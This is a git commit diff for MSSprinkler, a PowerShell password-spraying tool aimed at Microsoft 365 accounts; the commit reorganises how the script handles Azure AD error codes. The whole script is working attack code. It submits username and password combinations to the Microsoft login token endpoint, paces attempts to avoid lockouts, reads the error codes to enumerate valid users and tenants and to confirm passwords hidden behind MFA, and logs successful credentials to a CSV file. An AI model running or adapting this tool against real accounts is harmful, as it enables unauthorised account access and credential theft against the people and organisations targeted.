a228e70d3dac734936d578084a02bc11c6e6f082
LucidChartUser <31410218+TheresAFewConors@users.noreply.github.com>
2024-10-18 14:50:26 +0100

    refactored code
    refactored code to utilize 2d array stored in a hashmap, and pushed all logic out separately. This will make implementing new error codes simpler in future, and step towards nicer output.

--- mssprinkler.ps1
+++ mssprinkler.ps1
@@ -1,10 +1,10 @@
 function Invoke-MSSprinkler{
-    <#
+<#
     .Synopsis
         MSSprinkler is a password spraying utility that targets M365 accounts. It employs a 'low-and-slow' approach to avoid locking out accounts, and provides verbose information related to accounts / tenant information.
 
     .Description
-        Version: 0.12
+        Version: 0.2
         Author: Connor Jackson
         GitHub: https://github.com/theresafewconors/mssprinkler
 
@@ -30,127 +30,90 @@ Param(
     [int]$threshold = 8,
     [string]$url = 'https://login.microsoftonline.com',
     [string]$output
-    )
+)
 
 # Environment variables for output file
 $datetime = Get-Date -UFormat "%m/%d/%Y %R %Z"
 $sprayResult = @()
 
-# Create a list of usernames
+# Create a list of usernames + passwords to try
 $usernames = Get-Content $user
 $passwords = Get-Content $pass
 $total = $usernames.count * $passwords.count
 $exptime = $total / $threshold
 
-Write-Host "Expected time to complete is" $exptime "mins"
-
-<#
-ToDo:
-    - Verbose MFA info
-        - MS: DONE
-        - Duo: Done
-        - Google Auth: To do
-    - CSV Output
-#>
-
 Write-Host -ForegroundColor "yellow" "[*] The url to attack is" $url
 Write-Host -ForegroundColor "red" "[*] " $usernames.count "user(s) detected"
 Write-Host -ForegroundColor "red" "[*] " $passwords.count "password(s) detected"
-Write-Host -ForegroundColor "cyan" "[*] operating at" $threshold "spraying attempts per min"
-    if ($output -ne ""){
+Write-Host -ForegroundColor "cyan" "[*] operating at" $threshold "spraying attempts per min. $total combinations found. Expected time to complete is $exptime mins"
+if ($output -ne ""){
     Write-Host -ForegroundColor "yellow" "[*] Results will be saved to $output"
-    }
+}
 Write-Host -ForegroundColor "red" "[*] Starting Spray..."
 
-$ErrorActionPreference= 'silentlycontinue'
-for ($counter=0; $counter -lt $usernames.length; $counter++) {
-    $un = $usernames[$counter]
-    ForEach ($passes in $passwords){
-        # Web Request Info
-        $BodyParams = @{'client_id' = '5aa316d3-d05a-485f-a849-e05182f87d1d' ; 'client_info' = '1' ; 'grant_type' = 'password' ; username = $usernames[$counter] ; 'password' = $passes ; 'scope' = 'openid'}
-        $postHeaders =  @{'Accept' = 'application/json'; 'Content-Type' = 'application/x-www-form-urlencoded'}
-        $wr = Invoke-WebRequest -Uri $url/organizations/oauth2/v2.0/token -Method Post -Headers $postHeaders -Body $BodyParams -ErrorVariable errRes
+# Init the hashtable
+$errorResonseValues = @{}
 
-        If ($wr.StatusCode -eq "200"){
+# Error ID = (plaintext, csv result) Reference: https://learn.microsoft.com/en-us/entra/identity-platform/reference-error-codes
+$errorResonseValues["AADSTS50126"] = @("    The password for <username> appears to be incorrect.", "Failure")
+$errorResonseValues["AADSTS50053"] = @("    WARNING! <username> appears to be locked, skipping further attempts", "Account Locked")
+$errorResonseValues["AADSTS90002"] = @("    WARNING! <username> appears to be locked, skipping further attempts", "Account Locked")
+$errorResonseValues["AADSTS50034"] = @("    The user <username> not found, tenant appears correct. Skipping further attempts..", "User Does Not Exist")
+$errorResonseValues["AADSTS50059"] = @("    Supplied tenant for <username> not found, skipping further attempts..", "Tenant Does Not Exist")
+$errorResonseValues["AADSTS50076"] = @("[*] Password for <username> is correct but user has MFA enabled (DUO or MS)", "Correct Password, MFA Blocked")
+$errorResonseValues["AADSTS90014"] = @("    Issue with request")
+
+# Regex for the error ID starting with AADSTS..
+$regex = 'AADSTS\d{5}'
+
+$ErrorActionPreference = 'silentlycontinue'
+for ($counter = 0; $counter -lt $usernames.length; $counter++) {
+    $un = $usernames[$counter]
+    foreach ($passes in $passwords) {
+        # Web Request Info
+        $body = @{ 'client_id' = '5aa316d3-d05a-485f-a849-e05182f87d1d'; 'grant_type' = 'password'; username = $un; password = $passes; scope = 'openid' }
+        $headers = @{ Accept = 'application/json'; 'Content-Type' = 'application/x-www-form-urlencoded' }
+        $response = Invoke-WebRequest -Uri "$url/organizations/oauth2/v2.0/token" -Method Post -Body $body -Headers $headers -ErrorVariable errorResponse
+
+        # Convert error to string
+        $errorResponseString = $errorResponse | Out-String
+
+        # Successful login attempt
+        if ($response.StatusCode -eq 200) {
             Write-Host -ForegroundColor "green" "[*] SUCCESS! $un : $passes"
-            $result = "Success"
-            $sprayResult += "$datetime, $result, $un, $passes"
-            $wr = ""
-            Start-Sleep(60/$threshold)
+            $sprayResult += "$datetime, Success, $un, $passes"
+            $response = ""
+            Start-Sleep (60 / $threshold)
             break
-        }
-        else{
-            # Incorrect username or password
-            if ($errRes -match "AADSTS50126")
-            {
-                Write-Host "    The password for $un appears to be incorrect."
-                $result = "Failure"
-                $sprayResult += "$datetime, $result, $un, $passes"
-            }
-            # Account Locked
-            ElseIf($errRes -match "AADSTS50053" -or $errRes -match "AADSTS90002")
-            {
-                Write-Host -ForegroundColor "red" "    WARNING! $un appears to be locked, skipping further attempts"
-                $result = "Account Locked"
-                $sprayResult += "$datetime, $result, $un, $passes"
-                break
-            }
-            # Invalid Username
-            ElseIf($errRes -match "AADSTS50034")
-            {
-                Write-Host -ForegroundColor "yellow" "    The user $un doesn't exist, tenant appears correct. Skipping further attempts.."
-                $result = "User Does Not Exist"
-                $sprayResult += "$datetime, $result, $un, $passes"
-                break
-            }
-            # Invalid Tenant
-            ElseIf($errRes -match "AADSTS50059")
-            {
-                Write-Host "    Supplied tenant for $un doesn't exist, skipping further attempts.."
-                $result = "Tenant Does Not Exist"
-                $sprayResult += "$datetime, $result, $un, $passes"
-                break
-            }
-            # MFA
-            ElseIf($errRes -match "AADSTS50076")
-            {
-                Write-Host -ForegroundColor "Cyan" "[*] Password for $un is correct but user has MFA enabled (DUO or MS)"
-                $result = "Success: MFA Blocked"
-                $sprayResult += "$datetime, $result, $un, $passes"
-                break
-            }
-            else
-            {
-                Write-Host "This error has not yet been handled. Please open an issue on the Github page with the following information so it can be handled correctly"
-                Write-Host "Error Code: $errRes"
-                Write-Host "Link: https://github.com/theresafewconors/mssprinkler/issues"
+        } else {
+            # Handle unsuccessful attempts
+            if ($errorResponseString -match 'AADSTS\d{5}') {
+                $errorCode = $matches[0]
+                if ($errorResonseValues.ContainsKey($errorCode)) {
+                    # Get error message and replace <username> with the actual username
+                    $values = $errorResonseValues[$errorCode]
+                    $message = $values[0] -replace '<username>', $un
+                    # Special case for locked accounts, incorrect tenants or user not found
+                    if ($errorCode -eq "AADSTS50059" -or $errorCode -eq "AADSTS50034" -or $errorCode -eq "AADSTS50053") {
+                        Write-Host -ForegroundColor "Yellow" "$message"
+                        Start-Sleep (60 / $threshold)
+                        break
+                    } else {
+                        Write-Host "$message"
+                        $sprayResult += "$datetime, $($values[1]), $un, $passes"
+                        Start-Sleep (60 / $threshold)
+                    }
+                } else {
+                    Write-Host "Unhandled error code: $errorCode"
+                    Start-Sleep (60 / $threshold)
+                }
             }
         }
-        Start-Sleep(60/$threshold)
     }
 }
 
 # Write the output to a CSV file:
 if ($output) {
     $sprayResult | Out-File -Encoding ascii $output
-    #New-Item -Path . -Name $output -ItemType "file" -Value $sprayResult
 }
-
-# HTTP Status Code Response Values
-# https://learn.microsoft.com/en-us/graph/errors
-# todo
-
-# Hashtable lookup of error responses with what it means
-# Reference: https://learn.microsoft.com/en-us/entra/identity-platform/reference-error-codes
-$errorResonseValues = @{
-    AADSTS50029 = "Invalid URI provided"
-    AADSTS50034 = "User account not found (invalid username)"
-    AADSTS50059 = "Tenant not found"
-    AADSTS90002 = "Tenant ID not found"
-    AADSTS50126 = "Invalid username or password" # standard failed password?
-    AADSTS50128 = "Invalid domain name / Tenant does not exist"
-    # MFA Responses
-    AADSTS50076 = "MFA detected for user (DUO & Microsoft)" # tested for both
-    AADSTS50158 = "MFA detected for user (External Application)"
-    }
 }
